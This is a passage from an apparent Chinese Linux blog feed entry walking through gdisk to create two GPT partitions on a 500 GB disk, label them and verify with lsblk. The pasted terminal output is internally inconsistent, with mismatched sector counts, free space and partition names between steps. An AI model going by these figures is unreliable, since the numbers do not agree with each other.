table to disk and <span class="built_in">exit</span></span><br><span class="line">xextra functionality (experts only)</span><br><span class="line">?<span class="built_in">print</span> this menu</span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>):</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x67E5;&#x770B;&#x5206;&#x533A;&#x8868;&#x4FE1;&#x606F;"><a href="#&#x67E5;&#x770B;&#x5206;&#x533A;&#x8868;&#x4FE1;&#x606F;" class="headerlink" title="&#x67E5;&#x770B;&#x5206;&#x533A;&#x8868;&#x4FE1;&#x606F;"></a><strong>&#x67E5;&#x770B;&#x5206;&#x533A;&#x8868;&#x4FE1;&#x606F;</strong></h4><h5 id="&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x505A;&#x51FA;&#x6CA1;&#x6709;&#x5206;&#x533A;&#xFF0C;&#x6240;&#x4EE5;&#x5206;&#x533A;&#x8868;&#x4E3A;&#x7A7A;-&#x540E;&#x9762;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5206;&#x533A;&#x4FE1;&#x606F;"><a href="#&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x505A;&#x51FA;&#x6CA1;&#x6709;&#x5206;&#x533A;&#xFF0C;&#x6240;&#x4EE5;&#x5206;&#x533A;&#x8868;&#x4E3A;&#x7A7A;-&#x540E;&#x9762;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5206;&#x533A;&#x4FE1;&#x606F;" class="headerlink" title="&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x505A;&#x51FA;&#x6CA1;&#x6709;&#x5206;&#x533A;&#xFF0C;&#x6240;&#x4EE5;&#x5206;&#x533A;&#x8868;&#x4E3A;&#x7A7A;,&#x540E;&#x9762;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5206;&#x533A;&#x4FE1;&#x606F;"></a>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x505A;&#x51FA;&#x6CA1;&#x6709;&#x5206;&#x533A;&#xFF0C;&#x6240;&#x4EE5;&#x5206;&#x533A;&#x8868;&#x4E3A;&#x7A7A;,&#x540E;&#x9762;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5206;&#x533A;&#x4FE1;&#x606F;</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line">Disk /dev/sdd: 1048576000 sectors, 500.0 GiB</span><br><span class="line">Logical sector size: 512 bytes</span><br><span class="line">Disk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F306F33</span><br><span class="line">Partition table holds up to 128 entries</span><br><span class="line">First usable sector is 34, last usable sector is 104857566</span><br><span class="line">Partitions will be aligned on 2048-sector boundaries</span><br><span class="line">Total free space is 1048575330 sectors (500.0 GiB)</span><br><span class="line"></span><br><span class="line">Number  Start (sector)    End (sector)  Size       Code  Name</span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>):</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x521B;&#x5EFA;&#x5206;&#x533A;"><a href="#&#x521B;&#x5EFA;&#x5206;&#x533A;" class="headerlink" title="&#x521B;&#x5EFA;&#x5206;&#x533A;"></a><strong>&#x521B;&#x5EFA;&#x5206;&#x533A;</strong></h4><h5 id="&#x6253;&#x7B97;&#x5C06;500G&#x7684;&#x7A7A;&#x95F4;&#x5212;&#x5206;&#x6210;2&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x5206;&#x522B;&#x662F;100G&#x548C;400G&#xFF1A;-&#x521B;&#x5EFA;&#x5206;&#x533A;&#x662F;&#x7528;&#x547D;&#x4EE4;n&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x9009;&#x62E9;"><a href="#&#x6253;&#x7B97;&#x5C06;500G&#x7684;&#x7A7A;&#x95F4;&#x5212;&#x5206;&#x6210;2&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x5206;&#x522B;&#x662F;100G&#x548C;400G&#xFF1A;-&#x521B;&#x5EFA;&#x5206;&#x533A;&#x662F;&#x7528;&#x547D;&#x4EE4;n&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x9009;&#x62E9;" class="headerlink" title="&#x6253;&#x7B97;&#x5C06;500G&#x7684;&#x7A7A;&#x95F4;&#x5212;&#x5206;&#x6210;2&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x5206;&#x522B;&#x662F;100G&#x548C;400G&#xFF1A; &#x521B;&#x5EFA;&#x5206;&#x533A;&#x662F;&#x7528;&#x547D;&#x4EE4;n&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x9009;&#x62E9;"></a>&#x6253;&#x7B97;&#x5C06;500G&#x7684;&#x7A7A;&#x95F4;&#x5212;&#x5206;&#x6210;2&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x5206;&#x522B;&#x662F;100G&#x548C;400G&#xFF1A; &#x521B;&#x5EFA;&#x5206;&#x533A;&#x662F;&#x7528;&#x547D;&#x4EE4;n&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x9009;&#x62E9;</h5><p>1.&#x5206;&#x533A;number<br>2.&#x8D77;&#x59CB;&#x6247;&#x533A;<br>3.&#x7ED3;&#x675F;&#x6247;&#x533A;</p><h5 id="&#x8D77;&#x59CB;&#x6247;&#x533A;&#x53EF;&#x4EE5;&#x6572;&#x56DE;&#x8F66;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x800C;&#x7ED3;&#x675F;&#x6247;&#x533A;&#x7528;&#xFF0B;100G&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x51B3;&#x5B9A;&#x5206;&#x533A;&#x5927;&#x5C0F;&#x4E3A;100G-&#x5206;&#x533A;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6700;&#x65B0;&#x7684;&#x5206;&#x533A;&#x8868;"><a href="#&#x8D77;&#x59CB;&#x6247;&#x533A;&#x53EF;&#x4EE5;&#x6572;&#x56DE;&#x8F66;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x800C;&#x7ED3;&#x675F;&#x6247;&#x533A;&#x7528;&#xFF0B;100G&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x51B3;&#x5B9A;&#x5206;&#x533A;&#x5927;&#x5C0F;&#x4E3A;100G-&#x5206;&#x533A;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6700;&#x65B0;&#x7684;&#x5206;&#x533A;&#x8868;" class="headerlink" title="&#x8D77;&#x59CB;&#x6247;&#x533A;&#x53EF;&#x4EE5;&#x6572;&#x56DE;&#x8F66;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x800C;&#x7ED3;&#x675F;&#x6247;&#x533A;&#x7528;&#xFF0B;100G&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x51B3;&#x5B9A;&#x5206;&#x533A;&#x5927;&#x5C0F;&#x4E3A;100G &#x5206;&#x533A;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6700;&#x65B0;&#x7684;&#x5206;&#x533A;&#x8868;"></a>&#x8D77;&#x59CB;&#x6247;&#x533A;&#x53EF;&#x4EE5;&#x6572;&#x56DE;&#x8F66;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x800C;&#x7ED3;&#x675F;&#x6247;&#x533A;&#x7528;&#xFF0B;100G&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x51B3;&#x5B9A;&#x5206;&#x533A;&#x5927;&#x5C0F;&#x4E3A;100G &#x5206;&#x533A;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;p&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6700;&#x65B0;&#x7684;&#x5206;&#x533A;&#x8868;</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): n    </span><br><span class="line">Partition number (1-128, default 1): 1</span><br><span class="line">First sector (34-1048575660, default = 34) or {+-}size{KMGTP}: </span><br><span class="line">Information: Moved requested sector from 34 to 2048 <span class="keyword">in</span></span><br><span class="line">order to align on 2048-sector boundaries.</span><br><span class="line">Use <span class="string">&apos;l&apos;</span> on the experts<span class="string">&apos; menu to adjust alignment</span></span><br><span class="line"><span class="string">Last sector (2048-1048575660, default = 1048575660) or {+-}size{KMGTP}: +100G</span></span><br><span class="line"><span class="string">Current type is &apos;</span>Linux filesystem<span class="string">&apos;</span></span><br><span class="line"><span class="string">Hex code or GUID (L to show codes, Enter = 8300): </span></span><br><span class="line"><span class="string">Changed type of partition to &apos;</span>Linux filesystem<span class="string">&apos;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Command (? for help): p</span></span><br><span class="line"><span class="string">Disk /dev/sdd: 1048576000 sectors, 500.0 GiB</span></span><br><span class="line"><span class="string">Logical sector size: 512 bytes</span></span><br><span class="line"><span class="string">Disk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F366F33</span></span><br><span class="line"><span class="string">Partition table holds up to 128 entries</span></span><br><span class="line"><span class="string">First usable sector is 34, last usable sector is 104857566</span></span><br><span class="line"><span class="string">Partitions will be aligned on 2048-sector boundaries</span></span><br><span class="line"><span class="string">Total free space is 83886013 sectors (40.0 GiB)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Number  Start (sector)    End (sector)  Size       Code  Name</span></span><br><span class="line"><span class="string">   1            2048        20973567  100.0 GiB    8300  Linux filesystem</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Command (? for help): n</span></span><br><span class="line"><span class="string">Partition number (2-128, default 2): 2</span></span><br><span class="line"><span class="string">First sector (34-104857566, default = 20973568) or {+-}size{KMGTP}: </span></span><br><span class="line"><span class="string">Last sector (20973568-104857566, default = 104857566) or {+-}size{KMGTP}: </span></span><br><span class="line"><span class="string">Current type is &apos;</span>Linux filesystem<span class="string">&apos;</span></span><br><span class="line"><span class="string">Hex code or GUID (L to show codes, Enter = 8300): </span></span><br><span class="line"><span class="string">Changed type of partition to &apos;</span>Linux filesystem<span class="string">&apos;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Command (? for help): p</span></span><br><span class="line"><span class="string">Disk /dev/sdd: 1048576000 sectors, 500.0 GiB</span></span><br><span class="line"><span class="string">Logical sector size: 512 bytes</span></span><br><span class="line"><span class="string">Disk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F366F33</span></span><br><span class="line"><span class="string">Partition table holds up to 128 entries</span></span><br><span class="line"><span class="string">First usable sector is 34, last usable sector is 1048575660</span></span><br><span class="line"><span class="string">Partitions will be aligned on 2048-sector boundaries</span></span><br><span class="line"><span class="string">Total free space is 2014 sectors (1007.0 KiB)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Number  Start (sector)    End (sector)  Size       Code  Name</span></span><br><span class="line"><span class="string">   1            2048        209735677  100.0 GiB    8300  Linux filesystem</span></span><br><span class="line"><span class="string">   2       209735678       1048575660  400.0 GiB    8300  Linux filesystem</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Command (? for help):</span></span><br></pre></td></tr></tbody></table></figure><h4 id="&#x8BBE;&#x7F6E;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x4FE1;&#x606F;partlabel"><a href="#&#x8BBE;&#x7F6E;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x4FE1;&#x606F;partlabel" class="headerlink" title="&#x8BBE;&#x7F6E;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x4FE1;&#x606F;partlabel"></a><strong>&#x8BBE;&#x7F6E;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x4FE1;&#x606F;partlabel</strong></h4><h5 id="&#x6709;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x76D8;&#x7B26;&#x4F1A;&#x6F02;&#x79FB;&#xFF0C;&#x4F7F;&#x7528;sdx&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x5206;&#x8FA8;&#x78C1;&#x76D8;&#x662F;&#x4E0D;&#x9760;&#x8C31;&#xFF0C;&#x4F7F;&#x7528;lable&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x662F;&#x53EF;&#x9760;&#x7684;&#x3002;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x5462;&#xFF1F;"><a href="#&#x6709;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x76D8;&#x7B26;&#x4F1A;&#x6F02;&#x79FB;&#xFF0C;&#x4F7F;&#x7528;sdx&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x5206;&#x8FA8;&#x78C1;&#x76D8;&#x662F;&#x4E0D;&#x9760;&#x8C31;&#xFF0C;&#x4F7F;&#x7528;lable&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x662F;&#x53EF;&#x9760;&#x7684;&#x3002;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x5462;&#xFF1F;" class="headerlink" title="&#x6709;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x76D8;&#x7B26;&#x4F1A;&#x6F02;&#x79FB;&#xFF0C;&#x4F7F;&#x7528;sdx&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x5206;&#x8FA8;&#x78C1;&#x76D8;&#x662F;&#x4E0D;&#x9760;&#x8C31;&#xFF0C;&#x4F7F;&#x7528;lable&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x662F;&#x53EF;&#x9760;&#x7684;&#x3002;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x5462;&#xFF1F;"></a>&#x6709;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x76D8;&#x7B26;&#x4F1A;&#x6F02;&#x79FB;&#xFF0C;&#x4F7F;&#x7528;sdx&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x5206;&#x8FA8;&#x78C1;&#x76D8;&#x662F;&#x4E0D;&#x9760;&#x8C31;&#xFF0C;&#x4F7F;&#x7528;lable&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x662F;&#x53EF;&#x9760;&#x7684;&#x3002;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x6807;&#x7B7E;&#x5462;&#xFF1F;</h5><h5 id="c-&#x662F;&#x7528;&#x6765;&#x8BBE;&#x7F6E;partlable&#x7684;"><a href="#c-&#x662F;&#x7528;&#x6765;&#x8BBE;&#x7F6E;partlable&#x7684;" class="headerlink" title="c &#x662F;&#x7528;&#x6765;&#x8BBE;&#x7F6E;partlable&#x7684;"></a>c &#x662F;&#x7528;&#x6765;&#x8BBE;&#x7F6E;partlable&#x7684;</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): c </span><br><span class="line">Partition number (1-2): 1</span><br><span class="line">Enter name: test1</span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): c</span><br><span class="line">Partition number (1-2): 2</span><br><span class="line">Enter name: test2</span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line">Disk /dev/sdd: 1048576000 sectors, 500.0 GiB</span><br><span class="line">Logical sector size: 512 bytes</span><br><span class="line">Disk identifier (GUID): D3328858-7A3F-4A64-BC46-A7040F366F33</span><br><span class="line">Partition table holds up to 128 entries</span><br><span class="line">First usable sector is 34, last usable sector is 1048575660</span><br><span class="line">Partitions will be aligned on 2048-sector boundaries</span><br><span class="line">Total free space is 2014 sectors (1007.0 KiB)</span><br><span class="line"></span><br><span class="line">Number  Start (sector)    End (sector)  Size       Code  Name</span><br><span class="line">   1            2048       209735677   100.0 GiB    8300  bean_part1</span><br><span class="line">   2      209735678       1048575660   400.0 GiB    8300  bean_part2</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x4FDD;&#x5B58;&#x5206;&#x533A;&#x4FE1;&#x606F;"><a href="#&#x4FDD;&#x5B58;&#x5206;&#x533A;&#x4FE1;&#x606F;" class="headerlink" title="&#x4FDD;&#x5B58;&#x5206;&#x533A;&#x4FE1;&#x606F;"></a><strong>&#x4FDD;&#x5B58;&#x5206;&#x533A;&#x4FE1;&#x606F;</strong></h4><h5 id="&#x6211;&#x4EEC;&#x5C06;&#x78C1;&#x76D8;&#x5206;&#x6210;&#x4E86;2&#x4E2A;&#x533A;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x8D34;&#x4E0A;&#x4E86;partlabel&#xFF0C;&#x4F46;&#x662F;&#x9000;&#x51FA;gdisk&#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x4FDD;&#x5B58;&#xFF0C;&#x5426;&#x5219;&#x524D;&#x529F;&#x5C3D;&#x5F03;&#x3002;"><a href="#&#x6211;&#x4EEC;&#x5C06;&#x78C1;&#x76D8;&#x5206;&#x6210;&#x4E86;2&#x4E2A;&#x533A;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x8D34;&#x4E0A;&#x4E86;partlabel&#xFF0C;&#x4F46;&#x662F;&#x9000;&#x51FA;gdisk&#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x4FDD;&#x5B58;&#xFF0C;&#x5426;&#x5219;&#x524D;&#x529F;&#x5C3D;&#x5F03;&#x3002;" class="headerlink" title="&#x6211;&#x4EEC;&#x5C06;&#x78C1;&#x76D8;&#x5206;&#x6210;&#x4E86;2&#x4E2A;&#x533A;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x8D34;&#x4E0A;&#x4E86;partlabel&#xFF0C;&#x4F46;&#x662F;&#x9000;&#x51FA;gdisk&#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x4FDD;&#x5B58;&#xFF0C;&#x5426;&#x5219;&#x524D;&#x529F;&#x5C3D;&#x5F03;&#x3002;"></a>&#x6211;&#x4EEC;&#x5C06;&#x78C1;&#x76D8;&#x5206;&#x6210;&#x4E86;2&#x4E2A;&#x533A;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x8D34;&#x4E0A;&#x4E86;partlabel&#xFF0C;&#x4F46;&#x662F;&#x9000;&#x51FA;gdisk&#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x4FDD;&#x5B58;&#xFF0C;&#x5426;&#x5219;&#x524D;&#x529F;&#x5C3D;&#x5F03;&#x3002;</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line"></span><br><span class="line">Final checks complete. About to write GPT data. THIS WILL OVERWRITE EXISTING</span><br><span class="line">PARTITIONS!!</span><br><span class="line"></span><br><span class="line">Do you want to proceed? (Y/N): y</span><br><span class="line">OK; writing new GUID partition table (GPT).</span><br><span class="line">The operation has completed successfully.</span><br><span class="line">root@<span class="built_in">test</span>:~<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><h4 id="&#x6548;&#x679C;"><a href="#&#x6548;&#x679C;" class="headerlink" title="&#x6548;&#x679C;"></a><strong>&#x6548;&#x679C;</strong></h4><h5 id="&#x6109;&#x5FEB;&#x5730;&#x67E5;&#x770B;&#x5206;&#x533A;&#x6548;&#x679C;&#x5427;&#xFF1A;"><a href="#&#x6109;&#x5FEB;&#x5730;&#x67E5;&#x770B;&#x5206;&#x533A;&#x6548;&#x679C;&#x5427;&#xFF1A;" class="headerlink" title="&#x6109;&#x5FEB;&#x5730;&#x67E5;&#x770B;&#x5206;&#x533A;&#x6548;&#x679C;&#x5427;&#xFF1A;"></a>&#x6109;&#x5FEB;&#x5730;&#x67E5;&#x770B;&#x5206;&#x533A;&#x6548;&#x679C;&#x5427;&#xFF1A;</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="built_in">test</span>:~<span class="comment"># lsblk</span></span><br><span class="line">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT</span><br><span class="line">fd0      2:0    1     4K  0 disk </span><br><span class="line">sda      8:0    0    40G  0 disk </span><br><span class="line">&#x251C;&#x2500;sda1   8:1    0  30.5M  0 part </span><br><span class="line">&#x251C;&#x2500;sda2   8:2    0 488.3M  0 part </span><br><span class="line">&#x251C;&#x2500;sda3   8:3    0  31.1G  0 part /</span><br><span class="line">&#x251C;&#x2500;sda4   8:4    0     8G  0 part [SWAP]</span><br><span class="line">&#x2514;&#x2500;sda5   8:5    0 387.8M  0 part </span><br><span class="line">sdb      8:16   0    50G  0 disk </span><br><span class="line">&#x251C;&#x2500;sdb1   8:17   0     4G  0 part </span><br><span class="line">&#x2514;&#x2500;sdb2   8:18   0    46G  0 part /data/osd.4</span><br><span class="line">sdc      8:32   0    50G  0 disk </span><br><span class="line">&#x251C;&#x2500;sdc1   8:33   0     4G  0 part </span><br><span class="line">&#x2514;&#x2500;sdc2   8:34   0    46G  0 part /data/osd.5</span><br><span class="line">sdd      8:48   0   500G  0 disk </span><br><span class="line">&#x251C;&#x2500;sdd1   8:49   0   100G  0 part </span><br><span class="line">&#x2514;&#x2500;sdd2   8:50   0   400G  0 part </span><br><span class="line">sr0     11:0    1   1.6G  0 rom  </span><br><span class="line">root@<span class="built_in">test</span>:~<span class="comment"># ll /dev/disk/by-partlabel/</span></span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x 2 root root 180 Apr  1 22:23 ./</span><br><span class="line">drwxr-xr-x 9 root root 180 Apr  1 21:34 ../</span><br><span class="line">lrwxrwxrwx 1 root root  10 Apr  1 22:23 test1 -&gt; ../../sdd1</span><br><span class="line">lrwxrwxrwx 1 root root  10 Apr  1 22:23 test2 -&gt; ../../sdd2</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;h4 id=&quot;&amp;#x4F20;&amp;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
</feed>
